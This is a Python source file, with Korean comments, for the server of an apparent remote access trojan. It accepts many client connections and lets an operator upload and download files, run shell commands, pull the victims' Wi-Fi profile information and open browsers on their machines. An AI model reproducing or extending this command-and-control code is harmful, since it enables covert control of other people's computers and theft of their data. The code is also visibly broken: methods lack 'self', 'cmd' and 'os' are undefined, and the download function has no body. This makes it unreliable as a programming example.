from sendrecv import SendRecv
import socket
from datetime import datetime
import sys
import time

class Server:
    def __init__(self, ip = "0.0.0.0", port = 8888):
        self.host_ip = ip # 로컬 테스트시 'localhost', 외부 테스트시 포트포워딩 & '0.0.0.0'
        self.host_port = port
        self.all_connections = {} # 연결된 소켓 저장 dict[ip] = {"controller":controller, "con": connection, "codec"}
        self.conncection = None

    def create_socket(self):
        """ 소켓을 생성하여 연결한다 """
        try:
            sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.bind((self.host_ip, self.host_port))
            sock.listen(20)
        except socket.error as msg:
            yield "소켓 생성 에러 : " + str(msg) + "\n"
            yield "10초 후 다시 시도 합니다... \n"
            time.sleep(10)
            self.create_socket()
            return

        yield f"[*] 서버가 시작 됩니다 > {self.host_ip}:{self.host_port} | {datetime.now().strftime('%H:%M:%S')}\n"
        
        while True:
            try:
                conn, address = sock.accept()
                sock.setblocking(1)
                controller = SendRecv(conn)
                controller.send(":codec")
                codec = controller.recv().decode("utf-8")
                address = f"{address[0]}:{str([1])}"
                self.all_connections[address] = {"controller":controller, "con": conn, "codec": codec}
                yield f"{address} 연결 성공\n"
            except:
                yield f"{address} 연결 실패\n"


    def select_ip(self, target_ip):
        """ 명령을 내릴 연결된 ip를 선택한다 """
        try:
            self.conncection = self.all_connections[target_ip]
        except:
            return (False, "연결에 실패하였습니다 정보를 갱신하고 있습니다\n")
        return (True, f"{target_ip}에 정상적으로 연결되었습니다\n")

    def refresh(self):
        """ 연결된 클라이언트가 연결되어 있는지 확인&갱신 """
        for key in self.all_connections:
            try:
                controller = self.all_connections[key]["controller"]
                controller.send(str.encode(" "))
                controller.recv(201480) # 연결 확인
            except:
                del self.all_connections[key] # 연결이 끊긴 ip 삭제
                continue

        return self.all_connections.keys()
    
    def control(command):
        """ 명령어 총괄하는 함수 """
        try:
            if not command.strip(): return

            if command == ":help":
                help()
            elif ":download" in command:
                download(command)
            elif ":upload" in cmd:
                upload(command)
            elif cmd == ":kill":
                self.connection["controller"].send(b":kill")
                self.connection["con"].shutdown(2)
                self.connection["con"].close()
            elif ":exec" in command:
                command = "".join(command.split(":exec")).strip()
                if not command.strip(): return "사용법 : exec <명령어>\n"
                else:
                    try:
                        os.system(command)
                        return f"[*] :exec {command} 완료\n"
                    except Exception() as e:
                        return e.message+"\n"
            elif command == ":wifi":
                yield "[*] 와이파이 프로필 정보를 얻는중..."
                self.connection["controller"].send(b":wifi")
                info = self.connection["controller"].recv()
                info = info.decode(self.connection["codec"])

                if info == ":Error":
                    yield "[!] 에러! wifi정보를 클라이언트로부터 받아올수 없습니다"
                else:
                    yield "[*] INFO:\n"
                    yield info + "\n"
            elif ":browse" in command:
                self.browse(command)
            elif command.lower() == "cls" or command.lower() == "clear":
                yield ":cls"
            else:
                self.connection["controller"].send(command.encode(self.connection["codec"]))
                data = self.connection["controller"].recv()
                if data.strip():
                    yield data.decode(self.connection["codec"])
        except Exception as e:
            yield "[!] 에러가 발생하였습니다 : " + str(e) + "\n"

    def download(filetodown):
        command = filetodown
        filetodown = "".join(filetodown.split(":download")).strip()
        if filetodown:



    def runCMD():
        while True:
            pass


    def help():
        return """
Commands      Desscription
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
:help         도움메세지를 생성합니다
:download     클라이언트로부터 파일을 다운 받습니다
:upload       클라이언트에 파일을 업로드 합니다
:kill         해당 클라이언트와 연결을 끊습니다
:exec         외부 CLI에 명령을 합니다
:wifi         클라이언트의 wifi 정보를 가져옵니다
:browse       url로 부터 브라우저를 켭니다
cd -          클라이언트의 이전 경로로 이동합니다
cd --         클라이언트와 맨처음에 연결되었던 경로로 이동합니다
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
"""

#s= Server("0.0.0.0", 8888)